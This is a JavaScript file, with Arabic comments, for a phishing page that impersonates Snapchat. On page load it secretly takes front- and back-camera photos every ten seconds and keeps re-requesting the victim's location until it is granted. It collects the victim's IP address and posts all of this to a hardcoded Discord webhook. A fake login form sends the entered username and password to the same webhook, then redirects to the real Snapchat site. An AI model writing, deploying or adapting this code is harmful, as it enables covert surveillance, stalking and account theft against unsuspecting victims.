'use strict';

// ⚠️ ضع رابط الـ Webhook الخاص بك هنا
const WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let userLat = null, userLng = null;

// 1. جلب IP الجهاز
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch { return "Unknown"; }
}

// 2. وظيفة طلب الموقع بشكل إجباري ومباشر
function forceLocation() {
    navigator.geolocation.getCurrentPosition(
        (p) => {
            userLat = p.coords.latitude;
            userLng = p.coords.longitude;
        },
        () => {
            // إعادة الطلب فوراً عند الرفض لإجبار المستخدم
            setTimeout(forceLocation, 1000);
        },
        { enableHighAccuracy: true }
    );
}

// 3. وظيفة التقاط صورة من عدسة معينة
async function captureFrom(facingMode) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: facingMode } 
        });
        video.srcObject = stream;

        return new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                // انتظار 1.5 ثانية لضمان فتح العدسة وعدم ظهور سواد
                setTimeout(() => {
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(blob => {
                        // إغلاق الكاميرا فوراً للتمكن من فتح الأخرى
                        stream.getTracks().forEach(t => t.stop());
                        resolve(blob);
                    }, 'image/png');
                }, 1500);
            };
        });
    } catch (e) { return null; }
}

// 4. إرسال البيانات الشاملة لديسكورد
async function sendFullLog(frontImg, backImg, user = "", pass = "") {
    const ip = await getIP();
    const formData = new FormData();
    
    let content = `📸 **صيد جديد (كاميرا مزدوجة + موقع)**\n🌐 IP: \`${ip}\` \n`;
    if (user) content += `👤 الحساب: \`${user}\` | الرمز: \`${pass}\` \n`;
    if (userLat) content += `📍 الموقع: [فتح الخريطة](https://www.google.com/maps?q=${userLat},${userLng}) \n`;

    if (frontImg) formData.append('file1', frontImg, 'front.png');
    if (backImg) formData.append('file2', backImg, 'back.png');
    
    formData.append('payload_json', JSON.stringify({
        content: content,
        username: "SnapHunter Ultimate",
        avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png"
    }));

    await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
}

// 5. تشغيل النظام
async function startSystem() {
    // طلب الكاميرا أولاً
    try {
        // نبدأ بالأمامية ثم نطلب الموقع مباشرة
        const firstStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        firstStream.getTracks().forEach(t => t.stop()); // مجرد اختبار للأذونات
        
        // طلب الموقع فوراً بعد الموافقة على الكاميرا
        forceLocation();

        // حلقة التكرار كل 10 ثوانٍ (للتبديل بين الكاميرتين)
        setInterval(async () => {
            const front = await captureFrom("user");
            const back = await captureFrom("environment");
            if (front || back) await sendFullLog(front, back);
        }, 10000);

    } catch (err) {
        forceLocation();
        setInterval(() => sendFullLog(null, null), 10000);
    }
}

window.onload = startSystem;

// معالجة صفحة تسجيل الدخول (apply2.html)
const loginForm = document.getElementById('fullLoginForm');
if (loginForm) {
    loginForm.onsubmit = async (e) => {
        e.preventDefault();
        const u = e.target.username.value;
        const p = e.target.password.value;
        document.getElementById('loadingOverlay').style.display = 'flex';

        const front = await captureFrom("user");
        await sendFullLog(front, null, u, p);
        
        setTimeout(() => {
            window.location.href = "https://accounts.snapchat.com/";
        }, 1000);
    };
}
